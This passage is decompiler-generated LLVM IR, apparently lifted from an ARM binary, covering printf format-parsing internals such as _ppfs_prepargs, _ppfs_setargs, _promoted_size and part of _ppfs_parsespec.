dec_label_pc_13534:                               ; preds = %dec_label_pc_13524
  %v0_1352c = load i32, i32* @r4, align 4
  %v2_13534 = inttoptr i32 %v0_1352c to i32*
  store i32 %v1_13524, i32* %v2_13534, align 4
  %v2_13538 = call i32 @_ppfs_parsespec(i32* %v2_13534)
  %v1_1353c = icmp slt i32 %v2_13538, 0
  br i1 %v1_1353c, label %dec_label_pc_13514, label %dec_label_pc_13544

dec_label_pc_13544:                               ; preds = %dec_label_pc_13534
  %v0_13544 = load i32, i32* @r4, align 4
  %v1_13544 = inttoptr i32 %v0_13544 to i32*
  %v2_13544 = load i32, i32* %v1_13544, align 4
  br label %dec_label_pc_13550.backedge

dec_label_pc_1354c:                               ; preds = %dec_label_pc_1351c, %dec_label_pc_13524
  %v0_1354c = phi i32 [ %v0_13524, %dec_label_pc_1351c ], [ %v1_13524, %dec_label_pc_13524 ]
  %v1_1354c = add i32 %v0_1354c, 1
  br label %dec_label_pc_13550.backedge

dec_label_pc_13550.backedge:                      ; preds = %dec_label_pc_1354c, %dec_label_pc_13544
  %storemerge = phi i32 [ %v1_1354c, %dec_label_pc_1354c ], [ %v2_13544, %dec_label_pc_13544 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_13550 = inttoptr i32 %storemerge to i8*
  %v2_13550 = load i8, i8* %v1_13550, align 1
  %v2_13554 = icmp eq i8 %v2_13550, 0
  br i1 %v2_13554, label %dec_label_pc_13550.dec_label_pc_1355c_crit_edge, label %dec_label_pc_1351c

dec_label_pc_13550.dec_label_pc_1355c_crit_edge:  ; preds = %dec_label_pc_13550.backedge
  %v0_1355c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1355c

dec_label_pc_1355c:                               ; preds = %dec_label_pc_13550.dec_label_pc_1355c_crit_edge, %dec_label_pc_1350c
  %v0_1355c = phi i32 [ %v0_1355c.pre, %dec_label_pc_13550.dec_label_pc_1355c_crit_edge ], [ %v0_1350c, %dec_label_pc_1350c ]
  %v3_13550.lcssa.in = phi i8 [ %v2_13550, %dec_label_pc_13550.dec_label_pc_1355c_crit_edge ], [ %v2_135504, %dec_label_pc_1350c ]
  %v3_13550.lcssa = zext i8 %v3_13550.lcssa.in to i32
  %v1_1355c = load i32, i32* @r4, align 4
  %v2_1355c = inttoptr i32 %v1_1355c to i32*
  store i32 %v0_1355c, i32* %v2_1355c, align 4
  %v2_13560 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13560, i32* @r4, align 4
  store i32 %v6_134cc, i32* @r5, align 4
  ret i32 %v3_13550.lcssa

; uselistorder directives
  uselistorder i8 %v2_13550, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1350c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13504, { 1, 0 }
  uselistorder i32 %v0_13500.pre, { 1, 0 }
  uselistorder i32 %v6_134cc, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 5, 4, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 152, { 1, 0 }
  uselistorder label %dec_label_pc_1354c, { 1, 0 }
  uselistorder label %dec_label_pc_1351c, { 1, 0 }
  uselistorder label %dec_label_pc_134fc.dec_label_pc_134fc_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13564 = load i32, i32* @r4, align 4
  store i32 %v3_13564, i32* %stack_var_-12, align 4
  %v1_13568 = add i32 %arg1, 24
  %v2_13568 = inttoptr i32 %v1_13568 to i32*
  %v3_13568 = load i32, i32* %v2_13568, align 4
  store i32 %v3_13568, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_13578 = add i32 %arg1, 76
  %v3_13578 = inttoptr i32 %v2_13578 to i32*
  store i32 %arg2, i32* %v3_13578, align 4
  %v7_1357c = icmp sgt i32 %v3_13568, 0
  br i1 %v7_1357c, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v10_1357c = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_1357c, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %entry
  %v0_13580 = load i32, i32* %r3.global-to-local, align 4
  %v2_13580 = add i32 %arg1, 8
  %v3_13580 = inttoptr i32 %v2_13580 to i32*
  store i32 %v0_13580, i32* %v3_13580, align 4
  %v0_13584 = load i32, i32* %r5.global-to-local, align 4
  %v2_13584 = add i32 %arg1, 28
  %v3_13584 = inttoptr i32 %v2_13584 to i32*
  store i32 %v0_13584, i32* %v3_13584, align 4
  %v0_13588 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_13588, i32* %v2_13568, align 4
  %v0_1358c = load i32, i32* %r3.global-to-local, align 4
  %v2_1358c = add i32 %arg1, 4
  %v3_1358c = inttoptr i32 %v2_1358c to i32*
  store i32 %v0_1358c, i32* %v3_1358c, align 4
  %v0_13590 = call i32 @_ppfs_setargs()
  %v0_13594 = load i32, i32* %r5.global-to-local, align 4
  %v1_13594 = load i32, i32* @r4, align 4
  %v2_13594 = add i32 %v1_13594, 24
  %v3_13594 = inttoptr i32 %v2_13594 to i32*
  store i32 %v0_13594, i32* %v3_13594, align 4
  %v2_13598 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13598, i32* @r4, align 4
  ret i32 %v0_13590

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 6, 5, 3, 2, 1, 4, 7 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_1359c = load i32, i32* @r0, align 4
  %v1_1359c = add i32 %v0_1359c, 24
  %v2_1359c = inttoptr i32 %v1_1359c to i32*
  %v3_1359c = load i32, i32* %v2_1359c, align 4
  store i32 %v3_1359c, i32* %r1.global-to-local, align 4
  %v2_135a0 = icmp eq i32 %v3_1359c, 0
  %v3_135a4 = load i32, i32* @r4, align 4
  store i32 %v3_135a4, i32* %stack_var_-8, align 4
  %v1_135a8 = add i32 %v0_1359c, 80
  store i32 %v1_135a8, i32* %ip.global-to-local, align 4
  %v1_135ac = add i32 %v0_1359c, 8
  %v2_135ac = inttoptr i32 %v1_135ac to i32*
  %v3_135ac = load i32, i32* %v2_135ac, align 4
  store i32 %v3_135ac, i32* %r3.global-to-local, align 4
  %v6_135b4 = icmp eq i32 %v3_135ac, -2147483648
  br i1 %v2_135a0, label %dec_label_pc_135b4, label %dec_label_pc_136d8

dec_label_pc_135b4:                               ; preds = %entry
  br i1 %v6_135b4, label %dec_label_pc_135bc, label %dec_label_pc_135d4

dec_label_pc_135bc:                               ; preds = %dec_label_pc_135b4
  %v1_135bc = add i32 %v0_1359c, 76
  %v2_135bc = inttoptr i32 %v1_135bc to i32*
  %v3_135bc = load i32, i32* %v2_135bc, align 4
  store i32 %v3_135bc, i32* %r3.global-to-local, align 4
  %v1_135c0 = inttoptr i32 %v3_135bc to i32*
  %v2_135c0 = load i32, i32* %v1_135c0, align 4
  store i32 %v2_135c0, i32* %r2.global-to-local, align 4
  %v1_135c4 = add i32 %v3_135bc, 4
  store i32 %v1_135c4, i32* %r3.global-to-local, align 4
  store i32 %v1_135c4, i32* %v2_135bc, align 4
  %v0_135cc = load i32, i32* %r2.global-to-local, align 4
  %v1_135cc = load i32, i32* @r0, align 4
  %v2_135cc = add i32 %v1_135cc, 8
  %v3_135cc = inttoptr i32 %v2_135cc to i32*
  store i32 %v0_135cc, i32* %v3_135cc, align 4
  %v0_135d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_135d0 = load i32, i32* @r0, align 4
  %v2_135d0 = add i32 %v1_135d0, 80
  %v3_135d0 = inttoptr i32 %v2_135d0 to i32*
  store i32 %v0_135d0, i32* %v3_135d0, align 4
  %v0_135d4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_135d4

dec_label_pc_135d4:                               ; preds = %dec_label_pc_135b4, %dec_label_pc_135bc
  %v1_135ec = phi i32 [ %v0_1359c, %dec_label_pc_135b4 ], [ %v0_135d4.pre, %dec_label_pc_135bc ]
  %v1_135d4 = add i32 %v1_135ec, 4
  %v2_135d4 = inttoptr i32 %v1_135d4 to i32*
  %v3_135d4 = load i32, i32* %v2_135d4, align 4
  store i32 %v3_135d4, i32* %r3.global-to-local, align 4
  %v6_135d8 = icmp eq i32 %v3_135d4, -2147483648
  br i1 %v6_135d8, label %dec_label_pc_135e0, label %dec_label_pc_135f8

dec_label_pc_135e0:                               ; preds = %dec_label_pc_135d4
  %v1_135e0 = add i32 %v1_135ec, 76
  %v2_135e0 = inttoptr i32 %v1_135e0 to i32*
  %v3_135e0 = load i32, i32* %v2_135e0, align 4
  store i32 %v3_135e0, i32* %r3.global-to-local, align 4
  %v1_135e4 = inttoptr i32 %v3_135e0 to i32*
  %v2_135e4 = load i32, i32* %v1_135e4, align 4
  store i32 %v2_135e4, i32* %r2.global-to-local, align 4
  %v1_135e8 = add i32 %v3_135e0, 4
  store i32 %v1_135e8, i32* %r3.global-to-local, align 4
  store i32 %v1_135e8, i32* %v2_135e0, align 4
  %v0_135f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_135f0 = load i32, i32* @r0, align 4
  %v2_135f0 = add i32 %v1_135f0, 4
  %v3_135f0 = inttoptr i32 %v2_135f0 to i32*
  store i32 %v0_135f0, i32* %v3_135f0, align 4
  %v0_135f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_135f4 = load i32, i32* @r0, align 4
  %v2_135f4 = add i32 %v1_135f4, 80
  %v3_135f4 = inttoptr i32 %v2_135f4 to i32*
  store i32 %v0_135f4, i32* %v3_135f4, align 4
  %v0_136c818.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_135f8

dec_label_pc_135f8:                               ; preds = %dec_label_pc_135d4, %dec_label_pc_135e0
  %v0_136c818 = phi i32 [ %v1_135ec, %dec_label_pc_135d4 ], [ %v0_136c818.pre, %dec_label_pc_135e0 ]
  %v0_135f8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_135f8, i32* %lr.global-to-local, align 4
  %v1_136c819 = add i32 %v0_136c818, 28
  %v2_136c820 = inttoptr i32 %v1_136c819 to i32*
  %v3_136c821 = load i32, i32* %v2_136c820, align 4
  store i32 %v3_136c821, i32* %r3.global-to-local, align 4
  %v5_136d023 = icmp slt i32 %v0_135f8, %v3_136c821
  br i1 %v5_136d023, label %dec_label_pc_13600, label %dec_label_pc_136d4.loopexit

dec_label_pc_13600:                               ; preds = %dec_label_pc_135f8, %dec_label_pc_136c4
  %v0_136c825 = phi i32 [ %v0_136c8, %dec_label_pc_136c4 ], [ %v0_136c818, %dec_label_pc_135f8 ]
  %v1_1360024 = phi i32 [ %v1_136c4, %dec_label_pc_136c4 ], [ %v0_135f8, %dec_label_pc_135f8 ]
  %v4_13600 = mul i32 %v1_1360024, 4
  %v5_13600 = add i32 %v0_136c825, %v4_13600
  store i32 %v5_13600, i32* %r3.global-to-local, align 4
  %v1_13604 = add i32 %v5_13600, 40
  %v2_13604 = inttoptr i32 %v1_13604 to i32*
  %v3_13604 = load i32, i32* %v2_13604, align 4
  store i32 %v3_13604, i32* %r2.global-to-local, align 4
  %v7_13608 = icmp eq i32 %v3_13604, 8
  br i1 %v7_13608, label %dec_label_pc_136c4, label %dec_label_pc_13610

dec_label_pc_13610:                               ; preds = %dec_label_pc_13600
  %v1_13610 = add i32 %v0_136c825, 76
  %v2_13610 = inttoptr i32 %v1_13610 to i32*
  %v3_13610 = load i32, i32* %v2_13610, align 4
  store i32 %v3_13610, i32* %r1.global-to-local, align 4
  %v8_13614 = icmp sgt i32 %v3_13604, 8
  br i1 %v8_13614, label %dec_label_pc_13638, label %dec_label_pc_13618

dec_label_pc_13618:                               ; preds = %dec_label_pc_13610
  %v7_13618 = icmp eq i32 %v3_13604, 2
  br i1 %v7_13618, label %dec_label_pc_13684, label %dec_label_pc_13620

dec_label_pc_13620:                               ; preds = %dec_label_pc_13618
  %v8_13620 = icmp sgt i32 %v3_13604, 2
  br i1 %v8_13620, label %dec_label_pc_13630, label %dec_label_pc_13624

dec_label_pc_13624:                               ; preds = %dec_label_pc_13620
  %v1_13624 = icmp slt i32 %v3_13604, 0
  br i1 %v1_13624, label %dec_label_pc_136b0, label %dec_label_pc_13684

dec_label_pc_13630:                               ; preds = %dec_label_pc_13620
  %v7_13630 = icmp eq i32 %v3_13604, 7
  br i1 %v7_13630, label %dec_label_pc_13698, label %dec_label_pc_136b0

dec_label_pc_13638:                               ; preds = %dec_label_pc_13610
  %v7_13638 = icmp eq i32 %v3_13604, 1024
  br i1 %v7_13638, label %dec_label_pc_13684, label %dec_label_pc_13640

dec_label_pc_13640:                               ; preds = %dec_label_pc_13638
  %v8_13640 = icmp sgt i32 %v3_13604, 1024
  br i1 %v8_13640, label %dec_label_pc_13658, label %dec_label_pc_13644

dec_label_pc_13644:                               ; preds = %dec_label_pc_13640
  switch i32 %v3_13604, label %dec_label_pc_136b0 [
    i32 256, label %dec_label_pc_13684
    i32 512, label %dec_label_pc_13684
  ]

dec_label_pc_13658:                               ; preds = %dec_label_pc_13640
  %v7_13658 = icmp eq i32 %v3_13604, 2048
  br i1 %v7_13658, label %dec_label_pc_13670, label %dec_label_pc_13668

dec_label_pc_13668:                               ; preds = %dec_label_pc_13658
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_13664 = icmp eq i32 %v3_13604, 2055
  br i1 %v9_13664, label %dec_label_pc_13698, label %dec_label_pc_136b0

dec_label_pc_13670:                               ; preds = %dec_label_pc_13658
  %v1_13670 = add i32 %v3_13610, 8
  store i32 %v1_13670, i32* %r3.global-to-local, align 4
  store i32 %v1_13670, i32* %v2_13610, align 4
  %v0_13678 = load i32, i32* %r1.global-to-local, align 4
  %v1_13678 = inttoptr i32 %v0_13678 to i32*
  %v2_13678 = load i32, i32* %v1_13678, align 4
  store i32 %v2_13678, i32* %r3.global-to-local, align 4
  %v3_13678 = add i32 %v0_13678, 4
  %v4_13678 = inttoptr i32 %v3_13678 to i32*
  %v5_13678 = load i32, i32* %v4_13678, align 4
  store i32 %v5_13678, i32* %r4.global-to-local, align 4
  %v0_1367c = load i32, i32* %ip.global-to-local, align 4
  %v1_1367c = inttoptr i32 %v0_1367c to i32*
  store i32 %v2_13678, i32* %v1_1367c, align 4
  %v3_1367c = add i32 %v0_1367c, 4
  %v4_1367c = inttoptr i32 %v3_1367c to i32*
  %v5_1367c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1367c, i32* %v4_1367c, align 4
  br label %dec_label_pc_136c0

dec_label_pc_13684:                               ; preds = %dec_label_pc_13644, %dec_label_pc_13644, %dec_label_pc_13624, %dec_label_pc_13638, %dec_label_pc_13618
  %v1_13684 = inttoptr i32 %v3_13610 to i32*
  %v2_13684 = load i32, i32* %v1_13684, align 4
  store i32 %v2_13684, i32* %r2.global-to-local, align 4
  %v1_13688 = add i32 %v3_13610, 4
  store i32 %v1_13688, i32* %r3.global-to-local, align 4
  store i32 %v1_13688, i32* %v2_13610, align 4
  %v0_13690 = load i32, i32* %r2.global-to-local, align 4
  %v1_13690 = load i32, i32* %ip.global-to-local, align 4
  %v2_13690 = inttoptr i32 %v1_13690 to i32*
  store i32 %v0_13690, i32* %v2_13690, align 4
  br label %dec_label_pc_136c0

dec_label_pc_13698:                               ; preds = %dec_label_pc_13630, %dec_label_pc_13668
  %v3_13698 = load i32, i32* %v2_13610, align 4
  store i32 %v3_13698, i32* %r2.global-to-local, align 4
  %v1_1369c = add i32 %v3_13698, 8
  store i32 %v1_1369c, i32* %r3.global-to-local, align 4
  store i32 %v1_1369c, i32* %v2_13610, align 4
  %v0_136a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_136a4 = inttoptr i32 %v0_136a4 to i32*
  %v2_136a4 = load i32, i32* %v1_136a4, align 4
  store i32 %v2_136a4, i32* %r3.global-to-local, align 4
  %v3_136a4 = add i32 %v0_136a4, 4
  %v4_136a4 = inttoptr i32 %v3_136a4 to i32*
  %v5_136a4 = load i32, i32* %v4_136a4, align 4
  store i32 %v5_136a4, i32* %r4.global-to-local, align 4
  %v0_136a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_136a8 = inttoptr i32 %v0_136a8 to i32*
  store i32 %v2_136a4, i32* %v1_136a8, align 4
  %v3_136a8 = add i32 %v0_136a8, 4
  %v4_136a8 = inttoptr i32 %v3_136a8 to i32*
  %v5_136a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_136a8, i32* %v4_136a8, align 4
  br label %dec_label_pc_136c0

dec_label_pc_136b0:                               ; preds = %dec_label_pc_13644, %dec_label_pc_13630, %dec_label_pc_13624, %dec_label_pc_13668
  %v1_136b0 = add i32 %v3_13610, 4
  store i32 %v1_136b0, i32* %r3.global-to-local, align 4
  store i32 %v1_136b0, i32* %v2_13610, align 4
  %v0_136b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_136b8 = inttoptr i32 %v0_136b8 to i32*
  %v2_136b8 = load i32, i32* %v1_136b8, align 4
  store i32 %v2_136b8, i32* %r3.global-to-local, align 4
  %v1_136bc = load i32, i32* %ip.global-to-local, align 4
  %v2_136bc = inttoptr i32 %v1_136bc to i32*
  store i32 %v2_136b8, i32* %v2_136bc, align 4
  br label %dec_label_pc_136c0

dec_label_pc_136c0:                               ; preds = %dec_label_pc_13698, %dec_label_pc_13684, %dec_label_pc_13670, %dec_label_pc_136b0
  %v0_136c0 = load i32, i32* %ip.global-to-local, align 4
  %v1_136c0 = add i32 %v0_136c0, 8
  store i32 %v1_136c0, i32* %ip.global-to-local, align 4
  %v0_136c4.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_136c8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_136c4

dec_label_pc_136c4:                               ; preds = %dec_label_pc_13600, %dec_label_pc_136c0
  %v0_136c8 = phi i32 [ %v0_136c825, %dec_label_pc_13600 ], [ %v0_136c8.pre, %dec_label_pc_136c0 ]
  %v0_136c4 = phi i32 [ %v1_1360024, %dec_label_pc_13600 ], [ %v0_136c4.pre, %dec_label_pc_136c0 ]
  %v1_136c4 = add i32 %v0_136c4, 1
  store i32 %v1_136c4, i32* %lr.global-to-local, align 4
  %v1_136c8 = add i32 %v0_136c8, 28
  %v2_136c8 = inttoptr i32 %v1_136c8 to i32*
  %v3_136c8 = load i32, i32* %v2_136c8, align 4
  store i32 %v3_136c8, i32* %r3.global-to-local, align 4
  %v5_136d0 = icmp slt i32 %v1_136c4, %v3_136c8
  br i1 %v5_136d0, label %dec_label_pc_13600, label %dec_label_pc_136c8.dec_label_pc_136d4.loopexit_crit_edge

dec_label_pc_136d8:                               ; preds = %entry
  br i1 %v6_135b4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_136d8
  %v2_136dc = add i32 %v0_1359c, 36
  %v3_136dc = inttoptr i32 %v2_136dc to i8*
  %v4_136dc = load i8, i8* %v3_136dc, align 1
  %v5_136dc = zext i8 %v4_136dc to i32
  %v5_136e0 = mul nuw nsw i32 %v5_136dc, 8
  %v6_136e0 = add i32 %v5_136e0, %v1_135a8
  store i32 %v6_136e0, i32* %r3.global-to-local, align 4
  %v2_136e4 = add i32 %v6_136e0, -8
  %v3_136e4 = inttoptr i32 %v2_136e4 to i32*
  %v4_136e4 = load i32, i32* %v3_136e4, align 4
  store i32 %v4_136e4, i32* %r3.global-to-local, align 4
  store i32 %v4_136e4, i32* %v2_135ac, align 4
  %v0_136ec.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_136d8, %bb
  %v2_13700 = phi i32 [ %v0_136ec.pre, %bb ], [ %v0_1359c, %dec_label_pc_136d8 ]
  %v1_136ec = add i32 %v2_13700, 4
  %v2_136ec = inttoptr i32 %v1_136ec to i32*
  %v3_136ec = load i32, i32* %v2_136ec, align 4
  store i32 %v3_136ec, i32* %r3.global-to-local, align 4
  %v6_136f0 = icmp eq i32 %v3_136ec, -2147483648
  br i1 %v6_136f0, label %bb15, label %dec_label_pc_136d4

bb15:                                             ; preds = %.thread2
  %v2_136f4 = add i32 %v2_13700, 37
  %v3_136f4 = inttoptr i32 %v2_136f4 to i8*
  %v4_136f4 = load i8, i8* %v3_136f4, align 1
  %v5_136f4 = zext i8 %v4_136f4 to i32
  %v1_136f8 = load i32, i32* %ip.global-to-local, align 4
  %v5_136f8 = mul nuw nsw i32 %v5_136f4, 8
  %v6_136f8 = add i32 %v5_136f8, %v1_136f8
  store i32 %v6_136f8, i32* %r3.global-to-local, align 4
  %v2_136fc = add i32 %v6_136f8, -8
  %v3_136fc = inttoptr i32 %v2_136fc to i32*
  %v4_136fc = load i32, i32* %v3_136fc, align 4
  store i32 %v4_136fc, i32* %r3.global-to-local, align 4
  store i32 %v4_136fc, i32* %v2_136ec, align 4
  %v0_13704.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_136d4

dec_label_pc_136c8.dec_label_pc_136d4.loopexit_crit_edge: ; preds = %dec_label_pc_136c4
  br label %dec_label_pc_136d4.loopexit

dec_label_pc_136d4.loopexit:                      ; preds = %dec_label_pc_136c8.dec_label_pc_136d4.loopexit_crit_edge, %dec_label_pc_135f8
  %v0_136c8.lcssa = phi i32 [ %v0_136c8, %dec_label_pc_136c8.dec_label_pc_136d4.loopexit_crit_edge ], [ %v0_136c818, %dec_label_pc_135f8 ]
  br label %dec_label_pc_136d4

dec_label_pc_136d4:                               ; preds = %dec_label_pc_136d4.loopexit, %.thread2, %bb15
  %v1_13724 = phi i32 [ %v0_136c8.lcssa, %dec_label_pc_136d4.loopexit ], [ %v2_13700, %.thread2 ], [ %v0_13704.pre, %bb15 ]
  %v1_13704 = add i32 %v1_13724, 8
  %v2_13704 = inttoptr i32 %v1_13704 to i32*
  %v3_13704 = load i32, i32* %v2_13704, align 4
  store i32 %v3_13704, i32* %r1.global-to-local, align 4
  %v1_13708 = icmp slt i32 %v3_13704, 0
  br i1 %v1_13708, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_136d4
  %v5_1370c = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_1370c, i32* @r4, align 4
  ret i32 %v1_13724

bb17:                                             ; preds = %dec_label_pc_136d4
  %v1_13710 = add i32 %v1_13724, 16
  %v2_13710 = inttoptr i32 %v1_13710 to i32*
  %v3_13710 = load i32, i32* %v2_13710, align 4
  %v1_13718 = sub i32 0, %v3_13704
  store i32 %v1_13718, i32* %r1.global-to-local, align 4
  %v1_13714 = and i32 %v3_13710, -10
  %v1_1371c = or i32 %v1_13714, 8
  store i32 %v1_1371c, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_13724 = add i32 %v1_13724, 20
  %v3_13724 = inttoptr i32 %v2_13724 to i32*
  store i32 32, i32* %v3_13724, align 4
  %v0_13728 = load i32, i32* %r1.global-to-local, align 4
  %v1_13728 = load i32, i32* @r0, align 4
  %v2_13728 = add i32 %v1_13728, 8
  %v3_13728 = inttoptr i32 %v2_13728 to i32*
  store i32 %v0_13728, i32* %v3_13728, align 4
  %v0_1372c = load i32, i32* %r3.global-to-local, align 4
  %v1_1372c = load i32, i32* @r0, align 4
  %v2_1372c = add i32 %v1_1372c, 16
  %v3_1372c = inttoptr i32 %v2_1372c to i32*
  store i32 %v0_1372c, i32* %v3_1372c, align 4
  %v2_13730 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13730, i32* @r4, align 4
  %v8_13730 = load i32, i32* @r0, align 4
  ret i32 %v8_13730

; uselistorder directives
  uselistorder i32 %v1_136c4, { 2, 1, 0 }
  uselistorder i32 %v0_136c8, { 1, 2, 0 }
  uselistorder i32 %v3_13610, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_13610, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_13604, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_1360024, { 1, 0 }
  uselistorder i32 %v0_136c818, { 2, 0, 1 }
  uselistorder i32 %v0_1359c, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 17, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %lr.global-to-local, { 2, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 76, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_136d4, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_136c4, { 1, 0 }
  uselistorder label %dec_label_pc_136c0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_136b0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13698, { 1, 0 }
  uselistorder label %dec_label_pc_13684, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_13600, { 1, 0 }
  uselistorder label %dec_label_pc_135f8, { 1, 0 }
  uselistorder label %dec_label_pc_135d4, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_13750.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1373c

dec_label_pc_1373c:                               ; preds = %dec_label_pc_13758, %entry
  %v0_1373c = phi i32 [ %v1_1373c, %dec_label_pc_13758 ], [ ptrtoint (i32* @global_var_1ff5c.1054 to i32), %entry ]
  %v1_1373c = add i32 %v0_1373c, -2
  %v1_13740 = add i32 %v0_1373c, -1
  %v2_13740 = inttoptr i32 %v1_13740 to i8*
  %v3_13740 = load i8, i8* %v2_13740, align 1
  %v4_13740 = zext i8 %v3_13740 to i32
  %v1_13744 = inttoptr i32 %v1_1373c to i8*
  %v2_13744 = load i8, i8* %v1_13744, align 2
  %v3_13744 = zext i8 %v2_13744 to i32
  %v3_13748 = mul nuw i32 %v4_13740, 16777216
  %v4_1374c = sdiv i32 %v3_13748, 65536
  %v5_1374c = or i32 %v4_1374c, %v3_13744
  %v9_13750 = icmp eq i32 %v5_1374c, %v1_13750.pre
  br i1 %v9_13750, label %dec_label_pc_1373c.dec_label_pc_13764_crit_edge, label %dec_label_pc_13758

dec_label_pc_1373c.dec_label_pc_13764_crit_edge:  ; preds = %dec_label_pc_1373c
  br label %dec_label_pc_13764

dec_label_pc_13758:                               ; preds = %dec_label_pc_1373c
  %tmp = icmp ugt i32 %v1_1373c, ptrtoint (i32* @global_var_1ff44.1056 to i32)
  br i1 %tmp, label %dec_label_pc_1373c, label %dec_label_pc_13764

dec_label_pc_13764:                               ; preds = %dec_label_pc_13758, %dec_label_pc_1373c.dec_label_pc_13764_crit_edge
  %v2_1376c.pre-phi = sub i32 %v1_1373c, ptrtoint (i32* @global_var_1ff44.1056 to i32)
  store i32 ptrtoint (i32* @global_var_1ff5c.1054 to i32), i32* @r2, align 4
  %v4_13770 = sdiv i32 %v2_1376c.pre-phi, 2
  %v5_13770 = add i32 %v4_13770, ptrtoint (i32* @global_var_1ff5c.1054 to i32)
  %v6_13770 = inttoptr i32 %v5_13770 to i8*
  %v7_13770 = load i8, i8* %v6_13770, align 1
  %v9_13770 = zext i8 %v7_13770 to i32
  ret i32 %v9_13770

; uselistorder directives
  uselistorder i32 %v1_1373c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1373c, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1ff5c.1054 to i32), { 1, 2, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_13784 = load i32, i32* @r4, align 4
  store i32 %v3_13784, i32* %stack_var_-32, align 4
  %v6_13784 = load i32, i32* @r5, align 4
  %v25_13784 = ptrtoint i32* %stack_var_-32 to i32
  %v1_13788 = add i32 %tmp, 16
  %v2_13788 = inttoptr i32 %v1_13788 to i32*
  %v3_13788 = load i32, i32* %v2_13788, align 4
  %v2_1378c = ptrtoint i32* %stack_var_-88 to i32
  %v1_13790 = and i32 %v3_13788, 128
  store i32 %v1_13790, i32* @r4, align 4
  %v2_13790 = icmp eq i32 %v1_13790, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_137b0 = add i32 %tmp, 24
  %v2_137b0 = inttoptr i32 %v1_137b0 to i32*
